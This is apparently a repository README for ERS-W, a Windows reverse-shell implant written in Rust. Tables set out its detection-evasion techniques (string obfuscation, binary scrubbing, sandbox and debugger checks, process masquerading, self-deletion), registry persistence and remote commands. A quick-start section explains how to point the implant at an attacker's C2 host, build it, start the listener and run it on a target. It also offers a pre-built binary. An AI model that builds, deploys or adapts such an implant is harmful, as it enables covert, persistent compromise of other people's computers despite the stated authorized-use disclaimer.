# Evasive Reverse Shell — Windows (ERS-W)

A fully evasive WSS reverse shell implant for Windows, written in Rust, designed for **authorized security research and penetration testing** in controlled lab environments.

> **DISCLAIMER:** This tool is intended for authorized security testing, CTF challenges, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

## Stealth Rating: 24/24

| # | Check | Status |
|---|-------|--------|
| 1 | Tool/command strings | PASS |
| 2 | Privilege names | PASS |
| 3 | Registry/CVE strings | PASS |
| 4 | Output messages | PASS |
| 5 | Build/debug paths | PASS |
| 6 | Library strings (rustls/TLS/OpenSSL) | PASS |
| 7 | Entropy (6.82 — normal range) | PASS |
| 8 | Anti-debug (IsDebuggerPresent) | PASS |
| 9 | Self-delete (batch script) | PASS |
| 10 | Binary size (2.2 MB) | PASS |
| 11 | No packer signatures | PASS |
| 12 | Stripped symbols | PASS |
| 13 | Process masquerade (console title) | PASS |
| 14 | Network/C2 indicators | PASS |
| 15 | YARA rule triggers | PASS |
| 16 | File metadata | PASS |
| 17 | Suspicious API imports | PASS |
| 18 | Runtime string leaks | PASS |
| 19 | XOR string encoding (key=0xAB) | PASS |
| 20 | Compilation flags (opt-z, LTO, strip) | PASS |
| 21 | User-Agent encoding | PASS |
| 22 | Sandbox detection | PASS |
| 23 | Analysis tool names | PASS |
| 24 | Persistence/credential strings | PASS |

## Features

### Defense Evasion (8 Techniques)

| Technique | Description |
|-----------|-------------|
| **XOR String Obfuscation** | All sensitive strings encoded at compile time (key=0xAB) |
| **Binary Patching** | 494 post-build patches scrub rustls/TLS/OpenSSL/build path strings |
| **Sandbox Detection** | 6-check weighted scoring: process count, uptime, analysis tools, disk, RAM, username |
| **Anti-Debug** | `IsDebuggerPresent()` — exits silently if debugger attached |
| **Process Masquerade** | Console title set to "Windows Update Host" |
| **Self-Deletion** | Spawns delayed batch script to remove binary from disk |
| **Sleep Mask Encryption** | XOR-encrypt memory markers during sleep intervals |
| **Minimal Binary** | `opt-level="z"`, LTO, stripped, `panic="abort"` |

### Command & Control

| Feature | Description |
|---------|-------------|
| **WSS over TLS** | WebSocket Secure with rustls (pure Rust TLS) |
| **Chrome User-Agent** | Chrome 120 header impersonation (XOR encoded) |
| **Exponential Backoff** | 5s initial to 5min max with 30% jitter |
| **Auto-Reconnect** | Infinite reconnection loop with backoff |

### Builtins (18 Commands)

| Command | Description |
|---------|-------------|
| `whoami` | Current user (env-based, no process spawn) |
| `hostname` | Computer name |
| `pwd` / `cd` | Working directory / change directory |
| `ps` | Process list |
| `kill [pid]` | Kill process by PID |
| `info` | Full system information beacon |
| `set` | Environment variables |
| `persist` | Install registry Run key persistence |
| `pe` | Inline privilege escalation scan |
| `sleep [sec]` | Sleep with encrypted memory |
| `exit` | Self-delete and exit |
| `net/reg/ipconfig/netstat/tasklist` | Passthrough commands |

### Persistence

| Method | Description |
|--------|-------------|
| **Registry Run Key** | HKCU Run key (XOR encoded path) |
| **Binary Copy** | Copies to AppData (XOR encoded name) |

## Quick Start

```bash
# On Kali (attacker):
# 1. Edit src/main.rs — change ENC_C2_HOST to your IP
# 2. Build + scrub
bash build.sh
# 3. Generate TLS certs
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
# 4. Start listener
python3 listener.py 443

# On Windows target:
# Transfer ers-w.exe and run
```

### Cross-compile from Linux

```bash
rustup target add x86_64-pc-windows-gnu
sudo apt install gcc-mingw-w64-x86-64
bash build.sh
```

## Files

| File | Purpose |
|------|---------|
| `src/main.rs` | Implant source code |
| `build.sh` | Build + binary scrub script |
| `scrub.py` | 494-patch same-length binary patcher |
| `listener.py` | WSS C2 listener (same as ERS) |
| `win_rev_shell_wss.exe` | Pre-built scrubbed binary (2.2 MB) |

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| Web Protocols | T1071.001 |
| Encrypted Channel | T1573.002 |
| Obfuscation | T1027 |
| Masquerading | T1036.004 |
| Indicator Removal | T1070.004 |
| Debugger Evasion | T1622 |
| Virtualization Evasion | T1497 |
| Command Interpreter | T1059.003 |
| Registry Run Keys | T1547.001 |
| System Information | T1082 |
| Process Discovery | T1057 |

## Companion Projects

| Project | Platform | Stealth | Description |
|---------|----------|---------|-------------|
| [ERS](../ERS) | Linux | 20/20 | WSS reverse shell |
| **ERS-W** (this) | Windows | 24/24 | WSS reverse shell |
| [SPES](https://github.com/Un-9oon/stealth-privesc) | Linux | 20/20 | Privilege escalation scanner |
| [SPES-W](https://github.com/Un-9oon/stealth-privesc) | Windows | 24/24 | Privilege escalation scanner |

## License

For educational and authorized security research purposes only.
